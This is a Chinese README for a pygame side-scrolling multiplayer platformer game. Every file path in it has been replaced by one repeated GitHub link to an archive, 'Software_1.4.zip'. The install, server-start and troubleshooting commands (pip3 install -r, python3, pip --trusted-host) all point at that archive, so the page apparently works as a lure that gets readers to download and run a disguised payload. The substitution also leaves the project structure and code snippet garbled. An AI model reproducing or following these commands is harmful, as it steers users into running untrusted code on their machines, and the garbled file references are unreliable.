# 横版联机游戏

一个基于 pygame 开发的横版平台跳跃游戏，支持多人联机功能。

## 功能特性

- 🎮 经典横版平台跳跃玩法
- 🏃‍♂️ 流畅的角色移动、跳跃和冲刺
- 🎬 GIF动画支持（静止、移动、冲刺动画）
- 🌍 多层平台设计
- 🎵 背景音乐支持
- 🌐 多人联机功能
- 🎨 SVG 矢量图形资源

## 安装依赖

```bash
pip3 install pygame Pillow
```

或者使用 https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip：

```bash
pip3 install -r https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
```

## 游戏控制

## 游戏流程

### 主菜单
- 使用 ↑↓ 键选择菜单选项
- 回车键确认选择
- 选项：开始游戏、退出游戏

### 模式选择
- **本地联机**: 在同一网络内与朋友游戏
- **线上联机**: 连接到服务器与其他玩家游戏
- 使用 ↑↓ 键选择，回车确认，ESC返回

### 角色选择
- 使用 ←→ 键选择角色（勇士、忍者、战士）
- 回车/空格键输入玩家名称
- 输入完成后回车开始游戏
- ESC返回模式选择

## 游戏操作

- **移动**: A/D 键或方向键 ←/→
- **跳跃**: W 键、空格键或方向键 ↑
- **冲刺**: Shift + 移动键（速度提升1.5倍）
- **暂停**: ESC 键
- **返回主菜单**: 暂停状态下按 Q 键

## 联机模式

### 线上联机
1. 启动服务器：
   ```bash
   python3 https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
   ```
2. 启动游戏客户端
3. 在主菜单选择"开始游戏"
4. 选择"线上联机"模式
5. 选择角色并输入玩家名称
6. 游戏会自动尝试连接到 localhost:12345

### 本地联机
- 选择"本地联机"模式可以在本地网络环境下游戏
- 适合局域网内的多人游戏

### 网络配置

如果需要在不同电脑间联机，请修改 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 中的服务器地址：

```python
# 在 try_connect_to_server 方法中修改
https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip = NetworkClient(host='服务器IP地址', port=12345)
```

## 项目结构

```
Hajimi/
├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip              # 主游戏文件
├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip           # 网络通信模块
├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip      # 服务器启动脚本
├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip     # 依赖列表
├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip           # 说明文档
├── gif/                # 动画资源
│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
│   └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
├── img/                # 图片资源
│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip  # 背景图片
│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip      # 玩家角色
│   └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip    # 平台瓦片
└── music/              # 音乐资源
    └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
```

## 游戏特色

### 角色系统
- **多角色选择**：三种不同特色的角色
  - 勇士：平衡型角色，适合新手
  - 忍者：速度快，跳跃高
  - 战士：移动稳定，冲刺强
- **GIF动画支持**：角色支持多种动画状态
  - 静止动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip`
  - 移动动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 
  - 冲刺动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip`
- **冲刺功能**：按住Shift键同时移动可以冲刺，速度提升1.5倍
- **智能动画切换**：根据角色状态自动切换对应动画
- **方向翻转**：角色图像会根据移动方向自动翻转
- **个性化命名**：每个玩家可以自定义角色名称

### 界面系统
- **完整菜单系统**：主菜单、模式选择、角色选择界面
- **完整中文支持**：游戏界面完全支持中文显示
- **智能字体选择**：自动检测并使用系统最佳中文字体
- **跨平台兼容**：支持 macOS、Windows、Linux 系统字体
- **直观的导航**：清晰的操作提示和视觉反馈

### 关卡设计
- 多层平台布局
- 精美的背景和环境
- 物理引擎支持

### 联机功能
- 实时同步玩家位置
- 支持多人同时在线
- 自动处理玩家连接和断开
- 网络状态显示

## 开发说明

### 添加新功能

1. **新的游戏元素**: 在 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 中添加新的类
2. **网络消息**: 在 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 中扩展消息类型
3. **图形资源**: 在 `img/` 目录添加 SVG 文件
4. **音效**: 在 `music/` 目录添加音频文件

### 性能优化

- 游戏运行在 60 FPS
- 网络更新频率与游戏帧率同步
- SVG 资源自动缩放和优化

## 故障排除

### 常见问题

1. **pygame 安装失败**
   ```bash
   pip3 install --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip pygame
   ```

2. **无法连接服务器**
   - 确保服务器正在运行
   - 检查防火墙设置
   - 验证 IP 地址和端口

3. **图片加载失败**
   - 确保 `img/` 目录中有所需的 SVG 文件
   - 游戏会自动回退到简单图形

4. **音乐播放问题**
   - 确保 `music/` 目录中有音频文件
   - 检查音频格式支持

## 许可证

本项目仅供学习和娱乐使用。

## 贡献

欢迎提交 Issue 和 Pull Request 来改进游戏！